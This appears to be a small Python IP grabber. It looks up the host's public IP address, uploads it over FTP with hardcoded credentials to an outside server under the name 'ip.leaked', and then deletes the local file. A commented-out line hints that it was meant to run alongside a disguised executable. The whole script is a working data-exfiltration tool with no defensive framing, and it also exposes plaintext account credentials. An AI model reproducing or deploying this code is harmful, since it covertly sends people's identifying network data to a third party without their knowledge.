import requests
import os
from ftplib import FTP

#os.system('start target.exe')

ip = requests.get('https://api.ipify.org/').text

with open('output.txt', 'w') as file:
    file.write(ip)

username = 'half-pound-primes'
password = 'Awdwashere1337'

Server = FTP('files.000webhost.com')
Server.login(username, password)
print('Connected to server.')

file = open('output.txt', 'rb')
Server.storbinary('STOR /tmp/ip.leaked', file)
print('File Sent.')
file.close()
os.remove('output.txt')
Server.quit()
print('Exit.')
